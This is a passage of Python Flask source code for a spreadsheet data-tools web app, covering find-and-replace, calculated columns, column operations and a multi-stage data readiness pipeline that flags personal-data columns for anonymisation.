            cond_mask = text == needle
        elif operator == 'not_equals':
            cond_mask = text != needle
        elif operator == 'contains':
            cond_mask = text.str.contains(needle, na=False, regex=False)
        elif operator == 'not_contains':
            cond_mask = ~text.str.contains(needle, na=False, regex=False)
        elif operator == 'starts_with':
            cond_mask = text.str.startswith(needle, na=False)
        elif operator == 'ends_with':
            cond_mask = text.str.endswith(needle, na=False)
        elif operator in numeric_operators:
            try:
                limit = float(value)
            except (TypeError, ValueError):
                raise UserError(f'"{value}" is not a number, so it cannot be used with a greater/less than condition '
                                f'on column "{column}"')
            cond_mask = numeric_operators[operator](pd.to_numeric(col_data, errors='coerce'), limit)
        elif operator == 'is_empty':
            cond_mask = blank
        elif operator == 'is_not_empty':
            cond_mask = ~blank
        elif operator == 'in_list':
            cond_mask = text.isin([v.strip().lower() for v in str(value).split(',')])
        else:
            return jsonify({'error': f'Unknown operator: {operator}'}), 400

        if not groups or current_logic == 'OR':
            groups.append([cond_mask])
        else:
            groups[-1].append(cond_mask)

    mask = functools.reduce(operator_module.or_, (functools.reduce(operator_module.and_, g) for g in groups))

    # Apply filter
    filtered_df = df[mask]
    matching_rows = len(filtered_df)

    # Cleanup upload if preview only
    if preview_only:
        try:
            os.remove(upload_path)
        except:
            pass
        return jsonify({
            'success': True,
            'matching_rows': matching_rows,
            'original_rows': original_rows
        })

    # Save filtered file
    base_name = short_stem(filename)
    output_path = save_table(filtered_df, job_output_path(session_id, f"{base_name}_filtered_{session_id}.xlsx"), session_id,
                             log=make_log('Row Filter', original_rows, matching_rows, {'conditions': [{k: v for k, v in c.items() if k != 'value'} for c in conditions]}, session_id))
    output_filename = os.path.basename(output_path)

    # Cache the result
    cache_session_file(session_id, output_filename, output_path, matching_rows, len(filtered_df.columns), 'Row Filter')

    # Cleanup upload
    try:
        os.remove(upload_path)
    except:
        pass

    return jsonify({
        'success': True,
        'filename': output_filename,
        'download_url': job_download_url(session_id, output_filename),
        **job_notes.get(session_id, {}),
        'original_rows': original_rows,
        'matching_rows': matching_rows
    })

# =============================================================================
# FIND & REPLACE TOOL
# =============================================================================
@app.route('/find-replace')
def find_replace_page():
    return render_template('find_replace.html')

@app.route('/find-replace', methods=['POST'])
@rate_limit(max_requests=20, window=60)
@api_errors
def find_replace():
    """Perform find and replace on uploaded file"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400

    # Get parameters
    find_text = request.form.get('find_text', '')
    replace_text = request.form.get('replace_text', '')
    column = request.form.get('column', '__all__')
    case_sensitive = request.form.get('case_sensitive', 'false').lower() == 'true'
    use_regex = request.form.get('use_regex', 'false').lower() == 'true'
    match_whole_cell = request.form.get('match_whole_cell', 'false').lower() == 'true'

    if not find_text:
        return jsonify({'error': 'Find text is required'}), 400

    # Generate session ID
    session_id = f"{int(time.time())}_{secrets.token_hex(8)}"
    job_registry.bind(session_id, current_owner())
    filename = secure_filename(file.filename)
    upload_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_{filename}")
    save_upload(file, upload_path, session_id)

    # Read the file
    df = read_data_file(upload_path)

    discard_upload(upload_path)  # contents are loaded; do not keep the file
    # Track replacements
    total_replacements = 0
    rows_affected = set()

    # Determine which columns to process
    if column == '__all__':
        columns_to_process = df.columns.tolist()
    else:
        if column not in df.columns:
            return jsonify({'error': f'Column "{column}" not found'}), 400
        columns_to_process = [column]

    # Perform find and replace. Only non-blank cells that match are changed (a blank stays blank and a number
    # that does not match stays a number); user regexes run with time limits (datadragon_regex).
    budget = datadragon_regex.Budget()
    if use_regex:
        compiled = datadragon_regex.compile_pattern(find_text, ignore_case=not case_sensitive)
    else:
        compiled = datadragon_regex.compile_pattern(re.escape(find_text), ignore_case=not case_sensitive)
    # a literal search text always replaces with the literal replacement; a regex may use \1 / \g<name>
    template = replace_text if use_regex else (lambda match: replace_text)
        
    for col in columns_to_process:
        values = df[col].to_numpy(dtype=object)
        changed = np.zeros(len(values), dtype=bool)
        for i, value in enumerate(values):
            if pd.isna(value):
                continue
            text = value if isinstance(value, str) else _comparable_text(value)
            if match_whole_cell:
                if datadragon_regex.fullmatch(compiled, text, budget):
                    values[i], changed[i] = replace_text, True
                    total_replacements += 1
            else:
                new_text, count = datadragon_regex.substitute(compiled, template, text, budget)
                if count:
                    values[i], changed[i] = new_text, True
                    total_replacements += count
        if changed.any():
            rows_affected.update(df.index[changed].tolist())
            df[col] = pd.Series(values, index=df.index, dtype=object)

    # Save the modified file
    base_name = short_stem(filename)
    output_path = save_table(df, job_output_path(session_id, f"{base_name}_replaced_{session_id}.xlsx"), session_id,
                             log=make_log('Find & Replace', len(df), len(df),
                                          {'find_text_length': len(find_text), 'replace_text_length': len(replace_text), 'column': column,
                                           'case_sensitive': case_sensitive, 'use_regex': use_regex,
                                           'match_whole_cell': match_whole_cell, 'replacements_made': int(total_replacements),
                                           'rows_affected': len(rows_affected)}, session_id))
    output_filename = os.path.basename(output_path)

    # Cache the result
    cache_session_file(session_id, output_filename, output_path, len(df), len(df.columns), 'Find & Replace')

    # Cleanup upload
    try:
        os.remove(upload_path)
    except:
        pass

    return jsonify({
        'success': True,
        'filename': output_filename,
        'download_url': job_download_url(session_id, output_filename),
        **job_notes.get(session_id, {}),
        'replacements_made': int(total_replacements),
        'rows_affected': len(rows_affected)
    })

# =============================================================================
# CALCULATED COLUMNS TOOL
# =============================================================================
@app.route('/calculated-columns')
def calculated_columns_page():
    return render_template('calculated_columns.html')

@app.route('/calculated-columns', methods=['POST'])
@rate_limit(max_requests=20, window=60)
@api_errors
def calculated_columns():
    """Create calculated columns using formulas"""
    # Check for cached file or uploaded file
    cache_id = request.form.get('cache_id')

    if cache_id:
        # Use cached file
        cache_info = get_cached_file_by_id(cache_id)
        if not cache_info:
            return jsonify({'error': 'Cached file not found or expired'}), 400
        df = read_data_file(cache_info['path'])
        filename = cache_info['name']
        session_id = f"{int(time.time())}_{secrets.token_hex(8)}"
        job_registry.bind(session_id, current_owner())
        upload_path = None
    else:
        if 'file' not in request.files:
            return jsonify({'error': 'No file uploaded'}), 400

        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400

        # Generate session ID
        session_id = f"{int(time.time())}_{secrets.token_hex(8)}"
        job_registry.bind(session_id, current_owner())
        filename = secure_filename(file.filename)
        upload_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_{filename}")
        save_upload(file, upload_path, session_id)

        # Read the file
        df = read_data_file(upload_path)

        discard_upload(upload_path)  # contents are loaded; do not keep the file
    # Get parameters
    formula = request.form.get('formula', '')
    new_column_name = request.form.get('new_column_name', '')
    preview_only = request.form.get('preview_only', 'false').lower() == 'true'

    if not formula:
        return jsonify({'error': 'Formula is required'}), 400
    if not new_column_name and not preview_only:
        return jsonify({'error': 'New column name is required'}), 400

    # Parse and evaluate the formula
    try:
        result = evaluate_formula(inferred_copy(df), formula)
    except Exception as e:
        return jsonify({'error': f'Formula error: {str(e)}'}), 400

    # Add the result as a new column
    if preview_only:
        # Just return preview data
        new_col_name = new_column_name if new_column_name else 'Result'
        preview_df = df.head(5).copy()
        preview_df[new_col_name] = result.head(5)
        preview = preview_df.to_dict(orient='records')
        return jsonify({
            'success': True,
            'preview': preview
        })

    # Check if column already exists
    if new_column_name in df.columns:
        return jsonify({'error': f'Column "{new_column_name}" already exists'}), 400

    df[new_column_name] = result

    # Save the modified file
    base_name = short_stem(filename)
    output_path = save_table(df, job_output_path(session_id, f"{base_name}_calculated_{session_id}.xlsx"), session_id,
                             log=make_log('Calculated Columns', len(df), len(df),
                                          {'new_column': new_column_name, 'formula': formula}, session_id))
    output_filename = os.path.basename(output_path)

    # Cache the result
    cache_session_file(session_id, output_filename, output_path, len(df), len(df.columns), 'Calculated Columns')

    # Cleanup upload
    if upload_path:
        try:
            os.remove(upload_path)
        except:
            pass

    return jsonify({
        'success': True,
        'filename': output_filename,
        'download_url': job_download_url(session_id, output_filename),
        **job_notes.get(session_id, {}),
        'new_column': new_column_name,
        'rows': len(df),
        'columns': len(df.columns)
    })

def evaluate_formula(df, formula):
    """Evaluate a Calculated Columns formula (see datadragon_formula.py: parsed, never run as code)."""
    try:
        return safe_evaluate_formula(df, formula)
    except FormulaError:
        raise
    except Exception as e:
        raise UserError(f'Formula evaluation failed: {str(e)}')


# =============================================================================
# COLUMN OPERATIONS TOOL
# =============================================================================
@app.route('/column-operations')
def column_operations_page():
    return render_template('column_operations.html')

@app.route('/column-operations', methods=['POST'])
@rate_limit(max_requests=20, window=60)
@api_errors
def column_operations():
    """Perform column operations on uploaded file"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400

    # Get operation type
    operation = request.form.get('operation', '')
    if not operation:
        return jsonify({'error': 'No operation specified'}), 400

    # Generate session ID
    session_id = f"{int(time.time())}_{secrets.token_hex(8)}"
    job_registry.bind(session_id, current_owner())
    filename = secure_filename(file.filename)
    upload_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_{filename}")
    save_upload(file, upload_path, session_id)

    # Read the file
    df = read_data_file(upload_path)
    discard_upload(upload_path)  # contents are loaded; do not keep the file
    original_cols = df.columns.tolist()
    operation_summary = ""

    if operation == 'reorder':
        # Reorder columns
        column_order = request.form.get('column_order', '[]')
        try:
            column_order = json.loads(column_order)
        except:
            return jsonify({'error': 'Invalid column order format'}), 400

        if not isinstance(column_order, list) or not all(isinstance(c, str) for c in column_order):
            return jsonify({'error': 'Invalid column order format'}), 400

        # Validate all columns exist
        for col in column_order:
            if col not in df.columns:
                return jsonify({'error': f'Column "{col}" not found'}), 400

        # Listed columns first (each once); columns not listed keep their original order after them
        listed = list(dict.fromkeys(column_order))
        df = df[listed + [c for c in df.columns if c not in listed]]
        operation_summary = f"Reordered {len(listed)} columns"

    elif operation == 'rename':
        # Rename columns
        renames = request.form.get('renames', '{}')
        try:
            renames = json.loads(renames)
        except:
            return jsonify({'error': 'Invalid renames format'}), 400

        if not isinstance(renames, dict) or not all(isinstance(v, str) for v in renames.values()):
            return jsonify({'error': 'Invalid renames format: expected {"old name": "new name"}'}), 400
        if not renames:
            return jsonify({'error': 'No columns selected for renaming'}), 400

        # Validate old column names exist
        for old_name in renames.keys():
            if old_name not in df.columns:
                return jsonify({'error': f'Column "{old_name}" not found'}), 400

        new_names = [renames.get(c, c) for c in df.columns]
        if any(not str(n).strip() for n in new_names):
            return jsonify({'error': 'A column name cannot be empty'}), 400
        clashes = sorted({str(n) for n in new_names if new_names.count(n) > 1})
        if clashes:
            return jsonify({'error': f'Renaming would give more than one column the name: {", ".join(clashes)}'}), 400

        df = df.rename(columns=renames)
        operation_summary = f"Renamed {len(renames)} column(s)"

    elif operation == 'delete':
        # Delete columns
        columns_to_delete = request.form.get('columns_to_delete', '[]')
        try:
            columns_to_delete = json.loads(columns_to_delete)
        except:
            return jsonify({'error': 'Invalid columns format'}), 400

        if not isinstance(columns_to_delete, list) or not all(isinstance(c, str) for c in columns_to_delete):
            return jsonify({'error': 'Invalid columns format'}), 400
        if not columns_to_delete:
            return jsonify({'error': 'No columns selected for deletion'}), 400

        # Validate columns exist
        for col in columns_to_delete:
            if col not in df.columns:
                return jsonify({'error': f'Column "{col}" not found'}), 400

        df = df.drop(columns=columns_to_delete)
        operation_summary = f"Deleted {len(columns_to_delete)} column(s)"

    elif operation == 'duplicate':
        # Duplicate a column
        source_column = request.form.get('source_column', '')
        new_column_name = request.form.get('new_column_name', '')

        if not source_column:
            return jsonify({'error': 'Source column is required'}), 400
        if not new_column_name:
            return jsonify({'error': 'New column name is required'}), 400
        if source_column not in df.columns:
            return jsonify({'error': f'Column "{source_column}" not found'}), 400
        if new_column_name in df.columns:
            return jsonify({'error': f'Column "{new_column_name}" already exists'}), 400

        # Insert the duplicate after the source column
        source_idx = df.columns.get_loc(source_column)
        df.insert(source_idx + 1, new_column_name, df[source_column])
        operation_summary = f"Duplicated '{source_column}' as '{new_column_name}'"

    elif operation == 'split':
        # Split a column by delimiter
        column_to_split = request.form.get('column_to_split', '')
        delimiter = request.form.get('delimiter', '')
        new_names = request.form.get('new_names', '')

        if not column_to_split:
            return jsonify({'error': 'Column to split is required'}), 400
        if not delimiter:
            return jsonify({'error': 'Delimiter is required'}), 400
        if column_to_split not in df.columns:
            return jsonify({'error': f'Column "{column_to_split}" not found'}), 400

        # Parse new column names (comma-separated)
        if new_names:
            new_names = [n.strip() for n in new_names.split(',') if n.strip()]
        else:
            new_names = []

        # Split the column
        # The delimiter is literal text (not a regex); blank cells stay blank in every part
        cell_text = df[column_to_split].map(
            lambda v: None if pd.isna(v) else (v if isinstance(v, str) else _comparable_text(v)))
        split_df = cell_text.str.split(delimiter, expand=True, regex=False)
        num_parts = max(split_df.shape[1], 1)          # a file with no rows still gets one (empty) part
        split_df = split_df.reindex(columns=range(num_parts))

        # Generate column names if not enough provided
        if len(new_names) < num_parts:
            for i in range(len(new_names), num_parts):
                new_names.append(f"{column_to_split}_part{i+1}")

        # Use only the names needed
        new_names = new_names[:num_parts]

        # Check for duplicate column names
        for name in new_names:
            if name in df.columns and name != column_to_split:
                return jsonify({'error': f'Column "{name}" already exists'}), 400

        # Insert new columns after the original
        source_idx = df.columns.get_loc(column_to_split)

        # Drop original column
        df = df.drop(columns=[column_to_split])

        # Insert split columns
        for i, name in enumerate(new_names):
            df.insert(source_idx + i, name, split_df[i])

        operation_summary = f"Split '{column_to_split}' into {num_parts} columns"

    elif operation == 'merge':
        # Merge columns with separator
        columns_to_merge = request.form.get('columns_to_merge', '[]')
        separator = request.form.get('separator', '')
        new_column_name = request.form.get('new_column_name', '')

        try:
            columns_to_merge = json.loads(columns_to_merge)
        except:
            return jsonify({'error': 'Invalid columns format'}), 400

        if not isinstance(columns_to_merge, list) or not all(isinstance(c, str) for c in columns_to_merge):
            return jsonify({'error': 'Invalid columns format'}), 400
        if not columns_to_merge or len(columns_to_merge) < 2:
            return jsonify({'error': 'Select at least 2 columns to merge'}), 400
        if not new_column_name:
            return jsonify({'error': 'New column name is required'}), 400
        if new_column_name in df.columns:
            return jsonify({'error': f'Column "{new_column_name}" already exists'}), 400

        # Validate columns exist
        for col in columns_to_merge:
            if col not in df.columns:
                return jsonify({'error': f'Column "{col}" not found'}), 400

        # Merge columns
        # A blank part is empty text, never the word 'nan'/'None'
        parts = pd.DataFrame({
            i: df[col].map(lambda v: '' if pd.isna(v) else (v if isinstance(v, str) else _comparable_text(v)))
            for i, col in enumerate(columns_to_merge)
        })
        df[new_column_name] = parts.agg(separator.join, axis=1) if len(parts) else pd.Series([], dtype=object)

        # Move new column to after the last merged column
        first_col_idx = min(df.columns.get_loc(col) for col in columns_to_merge)

        # Reorder to put new column in place
        cols = df.columns.tolist()
        cols.remove(new_column_name)
        cols.insert(first_col_idx + len(columns_to_merge), new_column_name)
        df = df[cols]

        operation_summary = f"Merged {len(columns_to_merge)} columns into '{new_column_name}'"

    else:
        return jsonify({'error': f'Unknown operation: {operation}'}), 400

    # Save the modified file
    base_name = short_stem(filename)
    output_path = save_table(df, job_output_path(session_id, f"{base_name}_modified_{session_id}.xlsx"), session_id,
                             log=make_log('Column Operations', len(df), len(df),
                                          {'operation': operation, 'summary': operation_summary}, session_id))
    output_filename = os.path.basename(output_path)

    # Cache the result
    cache_session_file(session_id, output_filename, output_path, len(df), len(df.columns), 'Column Operations')

    # Cleanup upload
    try:
        os.remove(upload_path)
    except:
        pass

    return jsonify({
        'success': True,
        'filename': output_filename,
        'download_url': job_download_url(session_id, output_filename),
        **job_notes.get(session_id, {}),
        'summary': operation_summary,
        'original_columns': len(original_cols),
        'new_columns': len(df.columns)
    })

# =============================================================================
# DATA READINESS PIPELINE ROUTES
# =============================================================================

@app.route('/data-readiness-pipeline')
def data_readiness_pipeline():
    """Data Readiness Pipeline - guided multi-stage data assessment"""
    return render_template('data_readiness_pipeline.html')


@app.route('/pipeline/start', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def pipeline_start():
    """Start a new pipeline session - upload file and create session"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Please upload an Excel (.xlsx, .xls) or CSV file'}), 400

    # Generate unique session ID
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    session_id = f"pipeline_{timestamp}_{secrets.token_hex(8)}"

    # Save file
    filename = secure_filename(file.filename)
    upload_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_{filename}")
    save_upload(file, upload_path, session_id)

    # Create pipeline state
    make_room_for_pipeline(current_owner())
    state = PipelineState(session_id, upload_path, filename, owner=current_owner())
    job_registry.bind(session_id, state.owner)

    # Load DataFrame into memory
    try:
        state.df = read_data_file(upload_path)
    finally:
        discard_upload(upload_path)    # the DataFrame has the data; the uploaded copy is not kept
    state.row_count = len(state.df)
    state.col_count = len(state.df.columns)

    # Store session
    pipeline_sessions[session_id] = state

    # Get preview data (first 20 rows)
    preview_rows = df_preview(state.df, 20)

    return jsonify({
        'success': True,
        'session_id': session_id,
        'filename': filename,
        'rows': state.row_count,
        'columns': state.col_count,
        'column_names': list(state.df.columns),
        'preview': preview_rows
    })

@app.route('/pipeline/<session_id>/state', methods=['GET'])
def pipeline_get_state(session_id):
    """Get current pipeline state for resume/refresh"""
    state = owned_pipeline_state(session_id)
    if state is None:
        return jsonify({'error': 'Pipeline session not found or expired'}), 404
    return jsonify({
        'success': True,
        'state': state.to_dict(),
        'stage_data': {
            str(k): v is not None for k, v in state.stage_data.items()
        },
        'user_decisions': state.user_decisions,
        # what a reloaded page needs to rebuild its view of the session
        'columns': [str(c) for c in state.df.columns] if isinstance(state.df, pd.DataFrame) else [],
        'preview': df_preview(state.df, 20) if isinstance(state.df, pd.DataFrame) else [],
        'analysis': state.stage_data[1],
    })


@app.route('/pipeline/<session_id>/analyze', methods=['POST'])
@api_errors
def pipeline_analyze(session_id):
    """Stage 1: Run shape analysis on the uploaded data"""
    state = owned_pipeline_state(session_id)
    if state is None:
        return jsonify({'error': 'Pipeline session not found or expired'}), 404

    invalidate_pipeline_stages(state, 2)   # a new analysis makes later results and decisions stale

    # Create progress queue for SSE
    progress_queue = Queue()
    register_job(session_id, progress_queue)
    # Run analysis in background thread
    @guarded_job(progress_queue, session_id)
    def run_analysis():
        # Analyze the DataFrame
        analysis = analyze_dataframe(inferred_copy(state.df), progress_queue, session_id)

        # Extract gap summary for Stage 2
        gap_summary = []
        for col_name, col_info in analysis['columns'].items():
            if col_info['null_count'] > 0:
                gap_summary.append({
                    'column': col_name,
                    'null_count': col_info['null_count'],
                    'null_percentage': col_info['null_percentage'],
                    'detected_type': col_info.get('detected_type', 'Unknown'),
                    'unique_count': col_info.get('unique_count', 0)
                })

        # Sort by null percentage descending
        gap_summary = sorted(gap_summary, key=lambda x: x['null_percentage'], reverse=True)
        analysis['gap_summary'] = gap_summary

        # Detect potentially sensitive columns for Stage 4
        sensitive_patterns = ['name', 'email', 'phone', 'address', 'ssn', 'social',
                             'credit', 'account', 'password', 'dob', 'birth', 'salary']
        sensitive_columns = []
        for col_name in state.df.columns:
            col_lower = col_name.lower()
            for pattern in sensitive_patterns:
                if pattern in col_lower:
                    sensitive_columns.append({
                        'column': col_name,
                        'pattern_matched': pattern,
                        'unique_count': analysis['columns'].get(col_name, {}).get('unique_count', 0)
                    })
                    break
        analysis['sensitive_columns'] = sensitive_columns

        # Store results
        state.stage_data[1] = make_json_serializable(analysis)
        state.current_stage = 2

        # Send completion
        progress_queue.put({
            'stage': 'done',
            'percentage': 100,
            'message': 'Shape analysis complete',
            'analysis': make_json_serializable(analysis)
        })


    start_job(run_analysis)

    return jsonify({
        'success': True,
        'session_id': session_id,
        'message': 'Analysis started'
    })

@app.route('/pipeline/<session_id>/gaps', methods=['GET'])
def pipeline_get_gaps(session_id):
    """Stage 2: Get gap assessment data from Stage 1 analysis"""
    state = owned_pipeline_state(session_id)
    if state is None:
        return jsonify({'error': 'Pipeline session not found or expired'}), 404

    if state.stage_data[1] is None:
        return jsonify({'error': 'Stage 1 (Shape Analysis) must be completed first'}), 400

    analysis = state.stage_data[1]

    return jsonify({
        'success': True,
        'gap_summary': analysis.get('gap_summary', []),
        'total_columns': len(analysis.get('columns', {})),
        'columns_with_gaps': len(analysis.get('gap_summary', [])),
        'current_triage': state.user_decisions.get(2, {})
    })


@app.route('/pipeline/<session_id>/gaps/triage', methods=['POST'])
@api_errors
def pipeline_triage_gaps(session_id):
    """Stage 2: Save user's gap triage decisions"""
    state = owned_pipeline_state(session_id)
    if state is None:
        return jsonify({'error': 'Pipeline session not found or expired'}), 404

    triage_decisions = request.get_json()
    if not triage_decisions:
        return jsonify({'error': 'No triage decisions provided'}), 400

    # Store user decisions
    state.user_decisions[2] = triage_decisions
    state.stage_data[2] = {
        'gap_triage': triage_decisions,
        'completed_at': time.time()
    }
    state.current_stage = 3

    return jsonify({
        'success': True,
        'message': 'Gap triage decisions saved',
        'gaps_triaged': len(triage_decisions)
    })

@app.route('/pipeline/<session_id>/keys', methods=['POST'])
@api_errors
def pipeline_find_keys(session_id):
    """Stage 3: Find natural key candidates using Apriori algorithm"""
    state = owned_pipeline_state(session_id)
    if state is None:
        return jsonify({'error': 'Pipeline session not found or expired'}), 404

    data = request.get_json() or {}
    selected_columns = data.get('selected_columns', list(state.df.columns))
    allow_null_keys = str(data.get('allow_null_keys', False)).lower() in ('1', 'true', 'yes', 'on')

    if not selected_columns:
        return jsonify({'error': 'Please select at least one column'}), 400

    invalidate_pipeline_stages(state, 3)   # new key candidates: the chosen key and later stages are stale
    key_generation = state.generation

    # Create progress queue
    progress_queue = Queue()
    register_job(session_id, progress_queue)
    @guarded_job(progress_queue, session_id)
    def run_key_discovery():
        def send_progress(stage, pct, msg, current=0, total=0):
            progress_queue.put({
                'stage': stage,
                'percentage': pct,
                'message': msg,
                'current': current,
                'total': total
            })

        send_progress('loading', 2, 'Preparing data for analysis...')

        full_df = state.df
        total_rows = len(full_df)

        invalid_cols = [c for c in selected_columns if c not in full_df.columns]
        if invalid_cols:
            raise UserError(f"Columns not found: {', '.join(invalid_cols)}")

        # A key must identify every row: it is tested on the FULL data. When exact duplicate rows exist
        # nothing can be a key, so the search is repeated once on the de-duplicated rows and reported
        # separately ("unique after removing N exact duplicate rows").
        send_progress('filtering', 5, f'Checking for duplicate rows in {total_rows:,} records...')
        duplicate_count = int(full_df.duplicated().sum())

        # Columns with blanks make poor keys (a blank is not an identifier); skip them unless allowed
        null_columns = [] if allow_null_keys else [c for c in selected_columns if full_df[c].isna().any()]
        candidate_columns = [c for c in selected_columns if c not in null_columns]
        if null_columns:
            send_progress('filtering', 7, f'Skipping {len(null_columns)} column(s) with blank values: '
                          + ', '.join(null_columns))

        truncated_reasons = []

        def search(frame, lo, hi):
            """Minimal-key search on ``frame``; progress is scaled into lo..hi."""
            def report(stage, pct, msg, current=0, total=0):
                send_progress(stage, lo + int(pct / 100 * (hi - lo)), msg, current, total)
            result = find_minimal_keys(frame, candidate_columns, progress=report)
            if result['truncated']:
                truncated_reasons.append(result['reason'])
            return result['keys']

        if duplicate_count:
            send_progress('filtering', 8, f'{duplicate_count:,} exact duplicate rows found - no column '
                          'combination can be unique on the full data. Searching again without them.')
            minimal_combinations = []      # exact duplicate rows make every column combination non-unique
            after_dedup = search(full_df.drop_duplicates(keep='first'), 10, 92)
        else:
            send_progress('filtering', 8, f'No duplicate rows found. Analyzing {total_rows:,} rows.')
            minimal_combinations = search(full_df, 10, 92)
            after_dedup = []
        send_progress('complete', 92, f'Search complete. Found {len(minimal_combinations) + len(after_dedup)} minimal key(s).')

        # Store results
        key_results = {
            'minimal_combinations': minimal_combinations,
            'minimal_combinations_after_dedup': after_dedup,
            'selected_columns': selected_columns,
            'excluded_null_columns': null_columns,
            'truncated': bool(truncated_reasons),
            'truncated_reason': truncated_reasons[0] if truncated_reasons else '',
            'rows_analyzed': total_rows,
            'duplicate_rows': duplicate_count,
        }
        if state.generation != key_generation:
            return          # the stages were re-run meanwhile: these results are stale, do not store them
        state.stage_data[3] = key_results

        # Send single done message with results included
        progress_queue.put({
            'stage': 'done',
            'percentage': 100,
            'message': (f'Analysis complete! Found {len(minimal_combinations)} natural key candidate(s).'
                        if not duplicate_count else
                        f'Analysis complete! No key is unique on all {total_rows:,} rows; '
                        f'{len(after_dedup)} candidate(s) are unique after removing {duplicate_count:,} exact duplicate rows.'),
            'results': key_results
        })


    start_job(run_key_discovery)

    return jsonify({
        'success': True,
        'session_id': session_id,
        'message': 'Key discovery started'
    })

@app.route('/pipeline/<session_id>/keys/confirm', methods=['POST'])
@api_errors
def pipeline_confirm_keys(session_id):
    """Stage 3: Save user's key selection"""
    state = owned_pipeline_state(session_id)
    if state is None:
        return jsonify({'error': 'Pipeline session not found or expired'}), 404

    data = request.get_json()
    selected_key = data.get('selected_key', [])

    state.user_decisions[3] = {'selected_key': selected_key}
    if state.stage_data[3]:
        state.stage_data[3]['user_selected_key'] = selected_key
    state.current_stage = 4

    return jsonify({
        'success': True,
        'message': 'Key selection saved',
        'selected_key': selected_key
    })

@app.route('/pipeline/<session_id>/transformations', methods=['GET'])
def pipeline_get_transformations(session_id):
    """Stage 4: Get transformation recommendations based on analysis"""
    state = owned_pipeline_state(session_id)
    if state is None:
        return jsonify({'error': 'Pipeline session not found or expired'}), 404

    if state.stage_data[1] is None:
        return jsonify({'error': 'Stage 1 must be completed first'}), 400

    analysis = state.stage_data[1]
    recommendations = []

    # Check for sensitive columns that might need anonymization
    sensitive_cols = analysis.get('sensitive_columns', [])
    if sensitive_cols:
        # Build detailed column info with explanations
        column_details = []
        for col in sensitive_cols:
            pattern = col.get('pattern_matched', '')
            col_name = col.get('column', '')
            unique_count = col.get('unique_count', 0)

            # Generate explanation based on pattern
            pattern_explanations = {
                'name': 'Contains personal names - will be replaced with placeholders like NAM_00001',
                'email': 'Contains email addresses - will be replaced with placeholders like EMA_00001',
                'phone': 'Contains phone numbers - will be replaced with placeholders like PHO_00001',
                'address': 'Contains addresses - will be replaced with placeholders like ADD_00001',
                'ssn': 'Contains Social Security Numbers - will be replaced with placeholders like SSN_00001',
                'social': 'Contains social identifiers - will be replaced with placeholders',
                'credit': 'Contains credit card or financial info - will be replaced with placeholders',
                'account': 'Contains account numbers - will be replaced with placeholders like ACC_00001',
                'password': 'Contains passwords or secrets - will be replaced with placeholders',
                'dob': 'Contains dates of birth - will be replaced with placeholders (the dates are not kept)',
                'birth': 'Contains birth information - will be replaced with placeholders',
                'salary': 'Contains salary/compensation data - will be replaced with placeholders (amounts are not kept)'
            }
            explanation = pattern_explanations.get(pattern, 'May contain sensitive information')

            column_details.append({
                'column': col_name,
                'pattern': pattern,
                'unique_values': unique_count,
                'explanation': explanation
            })

        recommendations.append({
            'type': 'anonymization',
            'title': 'Data Anonymization',
            'description': 'Protect personally identifiable information (PII) by replacing each distinct value with a consistent placeholder (the same value always gets the same placeholder, so joins and counts still work).',
            'columns': [c['column'] for c in sensitive_cols],
            'column_details': column_details,
            'priority': 'high'
        })

    # Check for type inconsistencies that might need normalization
    type_issues = []
    for col_name, col_info in analysis.get('columns', {}).items():
        if col_info.get('detected_type') != 'Unknown':
            dtype = col_info.get('dtype', '')
            detected = col_info.get('detected_type', '')
            if 'object' in dtype and detected in ['Numeric', 'Integer', 'Date', 'Currency']:
                # Generate explanation based on detected type
                type_explanations = {
                    'Numeric': 'Stored as text but contains numbers - flagged only: this pipeline does not convert it (use the Data Normalizer)',
                    'Integer': 'Stored as text but contains whole numbers - flagged only: this pipeline does not convert it (use the Data Normalizer)',
                    'Date': 'Stored as text but contains dates - flagged only: this pipeline does not convert it (use the Data Normalizer)',
                    'Currency': 'Stored as text but contains currency values - flagged only: this pipeline does not convert it (use the Data Normalizer)'
                }
                explanation = type_explanations.get(detected, 'May need type conversion')

                type_issues.append({
                    'column': col_name,
                    'current': dtype,
                    'detected': detected,
                    'explanation': explanation
                })

    if type_issues:
        recommendations.append({
            'type': 'normalization',
            'title': 'Data Type Normalization',
            'description': 'Convert columns to their proper data types. This improves data quality, enables proper sorting, and allows mathematical operations.',
            'columns': [t['column'] for t in type_issues],
            'column_details': type_issues,
            'priority': 'medium'
        })

    # Check for gaps that need attention (from Stage 2 triage)
    gap_triage = state.user_decisions.get(2, {})
    gaps_needing_attention = [col for col, decision in gap_triage.items() if decision == 'needs_attention']
    if gaps_needing_attention:
        # Get gap details from analysis
        gap_details = []
        for col in gaps_needing_attention:
            col_info = analysis.get('columns', {}).get(col, {})
            null_pct = col_info.get('null_percentage', 0)
            null_count = col_info.get('null_count', 0)

            gap_details.append({
                'column': col,
                'missing_count': null_count,
                'missing_percentage': round(null_pct, 1),
                'explanation': f'{null_count:,} missing values ({null_pct:.1f}%) - can fill with default, interpolate, or flag for review'
            })

        recommendations.append({
            'type': 'gap_handling',
            'title': 'Missing Data Handling',
            'description': 'Address missing values in columns you flagged for attention. Options include filling with defaults, using statistical imputation, or flagging rows for manual review.',
            'columns': gaps_needing_attention,
            'column_details': gap_details,
            'priority': 'medium'
        })

    return jsonify({
        'success': True,
        'recommendations': recommendations,
        'current_selections': state.user_decisions.get(4, {})
    })


@app.route('/pipeline/<session_id>/transformations/select', methods=['POST'])
@api_errors
def pipeline_select_transformations(session_id):
    """Stage 4: Save user's transformation selections"""
    state = owned_pipeline_state(session_id)
    if state is None:
        return jsonify({'error': 'Pipeline session not found or expired'}), 404

